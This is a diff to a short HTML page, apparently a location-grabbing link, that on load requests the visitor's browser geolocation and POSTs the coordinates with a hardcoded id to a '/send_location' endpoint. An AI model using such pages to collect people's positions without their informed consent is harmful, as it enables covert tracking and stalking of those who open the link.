@@ -1,24 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tracking...</title>
-</head>
-<body>
-  <h3>📍 Fetching location...</h3>
+  <title>Location Tracker</title>
   <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      fetch('/send_location', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          id: new URLSearchParams(window.location.search).get('id')
-        })
-      });
-    });
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch('/send_location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              id: "6128977711"
+            })
+          }).then(response => response.json()).then(data => {
+            alert("Location sent successfully!");
+          }).catch(error => {
+            alert("Failed to send location.");
+            console.error(error);
+          });
+        });
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
   </script>
+</head>
+<body onload="sendLocation()">
+  <h2>Tracking your location...</h2>
 </body>
 </html>
